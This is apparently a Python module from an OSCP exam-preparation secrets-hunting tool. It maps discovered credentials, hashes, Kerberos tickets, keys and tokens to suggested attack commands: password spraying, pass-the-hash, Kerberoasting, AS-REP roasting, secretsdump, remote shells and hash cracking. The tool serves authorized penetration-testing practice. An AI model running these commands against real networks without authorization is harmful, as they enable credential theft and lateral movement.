"""playbook.py - findings-driven NEXT STEPS.

OSCP/OSCP+ legal: these are SUGGESTIONS for manual, exam-legal techniques
(hashcat/john cracking, impacket, netexec, evil-winrm, gpp-decrypt, certipy).
Lines tagged [LAB-ONLY] rely on LLMNR/NBT-NS poisoning or NTLM relay, which
depend on spoofing - explicitly PROHIBITED on the OSCP exam. They are shown for
real-world/lab use only; do NOT use them on the exam.

Keys match the signal names secrethound.py derives from finding categories and
detail prefixes.
"""
PLAYBOOK = {
    "CRED PAIRS": [
        ("validate the credential", "netexec smb <DC-IP> -u '<user>' -p '<pass>' -k", "green [+] = valid. Drop -k if NTLM allowed."),
        ("spray it (password reuse)", "netexec smb <DC-IP> -u users.txt -p '<pass>' --continue-on-success -k", "may belong to a DIFFERENT user."),
        ("try a shell", "evil-winrm -i <DC-IP> -u '<user>' -p '<pass>'   # -r <REALM> for kerberos", "needs Remote Management Users."),
    ],
    "ENCODED/DECODED": [("validate the decoded value", "netexec smb <DC-IP> -u '<user>' -p '<decoded>' -k", "base64-wrapped = almost always live creds.")],
    "SQLITE": [("if password column is a HASH, crack it", "hashid '<hash>'; hashcat <hash> rockyou.txt", "plaintext row = use directly with netexec.")],
    "ASSIGNED SECRETS": [("reuse the value", "netexec smb <DC-IP> -u '<user>' -p '<value>' -k   # or ssh/mysql/winrm", "config secrets are reused across services.")],
    # ---- AD: Kerberos ------------------------------------------------------
    "Kerberoast TGS": [
        ("crack the service ticket", "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule", "RC4 ($23). AES = -m 19600/19700."),
        ("obtain (assumed-breach cred)", "impacket-GetUserSPNs -request -dc-ip <DC> <DOMAIN>/<user>:<pass>", "service acct passwords are often weak."),
    ],
    "AS-REP roast": [
        ("crack AS-REP", "hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule", "account has DONT_REQ_PREAUTH."),
        ("obtain", "impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC> -no-pass", ""),
    ],
    "Kerberos pre-auth": [("crack", "hashcat -m 7500 krb5pa.txt rockyou.txt", "captured AS-REQ pre-auth.")],
    "DCC2": [("crack cached domain creds", "hashcat -m 2100 dcc2.txt rockyou.txt", "PBKDF2, slow. NOT pass-the-hash-able.")],
    # ---- AD: NTLM ----------------------------------------------------------
    "NTLM hash": [
        ("pass-the-hash (no cracking)", "netexec smb <DC-IP> -u '<user>' -H <NThash>", "works for SMB/WinRM/WMI."),
        ("OR crack the NT hash", "hashcat -m 1000 <NThash> rockyou.txt", ""),
        ("dump more (if admin)", "impacket-secretsdump -hashes :<NThash> <DOMAIN>/<user>@<DC> -just-dc", ""),
    ],
    "NTLM": [("pass-the-hash or crack", "netexec smb <DC-IP> -u '<user>' -H <NThash>   # or hashcat -m 1000", "")],
    # iter-16: removed Responder (LLMNR/NBT-NS poisoning) and ntlmrelayx
    # (NTLM relay) command suggestions. Both are spoofing primitives and
    # prohibited on the OSCP+ exam regardless of [LAB-ONLY] tagging - a
    # copy-pasteable command in the playbook output is risky to ship.
    # Cracking remains as the only legal path.
    "NetNTLMv2": [
        ("crack (PCAP/coerced source)", "hashcat -m 5600 hashes.txt rockyou.txt",
         "challenge/response - not PtH-able. Capture requires spoofing "
         "primitives prohibited on OSCP+ exam; cracking only."),
    ],
    # iter-16: removed crack.sh suggestion - public online cracking service
    # is OUT-OF-SCOPE for exam (and reveals the hash to a third party).
    "NetNTLMv1": [("crack v1 offline", "hashcat -m 5500 hashes.txt rockyou.txt",
                   "NetNTLMv1 cracking is offline only - no online services on exam.")],
    # ---- hashes ------------------------------------------------------------
    "bcrypt": [("crack bcrypt", "hashcat -m 3200 hashes.txt rockyou.txt", "slow by design.")],
    "sha512crypt": [("crack $6$ (Linux shadow)", "unshadow passwd shadow > u; hashcat -m 1800 u rockyou.txt", "standard Linux shadow hash.")],
    "sha256crypt": [("crack $5$", "hashcat -m 7400 hashes.txt rockyou.txt", "")],
    "md5crypt": [("crack $1$", "hashcat -m 500 hashes.txt rockyou.txt", "older Linux / Cisco type5.")],
    "yescrypt": [("crack $y$ (modern shadow)", "john --format=crypt hashes.txt --wordlist=rockyou.txt", "hashcat has no yescrypt mode - use john.")],
    "phpass": [("crack WP/phpBB", "hashcat -m 400 hashes.txt rockyou.txt", "")],
    "apr1": [("crack htpasswd", "hashcat -m 1600 hashes.txt rockyou.txt", "Apache basic-auth.")],
    "KeePass": [("crack KeePass", "keepass2john <file.kdbx> > kp.hash; hashcat -m 13400 kp.hash rockyou.txt", "use -k for a keyfile.")],
    "MySQL4.1+": [("crack MySQL", "hashcat -m 300 hashes.txt rockyou.txt", "strip leading '*'.")],
    "MSSQL 2012+": [("crack MSSQL", "hashcat -m 1731 hashes.txt rockyou.txt", "")],
    # ---- keys / tokens / files --------------------------------------------
    "Private key": [
        ("use SSH key", "chmod 600 <keyfile>; ssh -i <keyfile> <user>@<TARGET-IP>", "wrong perms = ssh refuses."),
        ("crack if encrypted", "ssh2john <keyfile> > k.hash; hashcat -m 22921 k.hash rockyou.txt", "look for 'ENCRYPTED' in header."),
    ],
    "GPP cpassword": [
        ("decrypt (public AES key - instant)", "gpp-decrypt '<cpassword-value>'", "Microsoft published the key. Guaranteed plaintext."),
        ("validate recovered cred", "netexec smb <DC-IP> -u '<user>' -p '<decrypted>' -k", "GPP creds often local-admin everywhere."),
    ],
    "Ansible Vault": [("crack the vault", "ansible2john vault.yml > v.hash; hashcat -m 16900 v.hash rockyou.txt", "or ansible-vault view if you have the pw.")],
    "AWS access key": [("validate + enum", "aws configure set aws_access_key_id <AKIA...>; aws sts get-caller-identity", "then aws s3 ls / iam list-users.")],
    "JWT": [("inspect + attack", "echo '<jwt>' | cut -d. -f2 | base64 -d", "try alg:none, or hashcat -m 16500.")],
    "conn string": [("connect", "mysql -h <host> -u <user> -p<pass>   # or mssqlclient.py <user>@<host>", "creds are in the URI.")],
    "URL with creds": [("extract + reuse", "# parse proto://user:pass@host; test against other services", "people reuse these.")],
    "INTERESTING FILES": [("read / process each flagged file", "cat <file>   # .pfx: certipy auth -pfx; .kdbx: keepass2john; .keytab: klist -k", "secret may be unlabeled.")],
}

SIGNAL_ORDER = [
    "CRED PAIRS", "ENCODED/DECODED", "GPP cpassword", "SQLITE", "ASSIGNED SECRETS",
    "NTLM hash", "NTLM", "Kerberoast TGS", "AS-REP roast", "Kerberos pre-auth",
    "NetNTLMv2", "NetNTLMv1", "DCC2", "bcrypt", "sha512crypt", "sha256crypt",
    "md5crypt", "yescrypt", "phpass", "apr1", "MySQL4.1+", "MSSQL 2012+",
    "Private key", "KeePass", "Ansible Vault", "AWS access key", "JWT",
    "conn string", "URL with creds", "INTERESTING FILES",
]


def emit(report, signals_present, ui):
    seen = set()
    steps = []
    for s in SIGNAL_ORDER:
        if s in signals_present and s in PLAYBOOK and s not in seen:
            steps.append((s, PLAYBOOK[s]))
            seen.add(s)
    if not steps:
        return
    c = ui.c
    bullet = "▸" if not ui.ascii else ">"
    out = ["\n" + ui.section("NEXT STEPS  (based on your findings)")]
    for sig, entries in steps:
        out.append(c("yellow", f"\n  {bullet} {sig}"))
        for label, cmd, note in entries:
            lab = "[LAB-ONLY]" in label or "[LAB-ONLY]" in note
            out.append(c("red" if lab else "green", f"    {label}:"))
            out.append("      " + c("cyan", cmd))
            if note:
                out.append(c("dim", f"        ({note})"))
    print("\n".join(out))
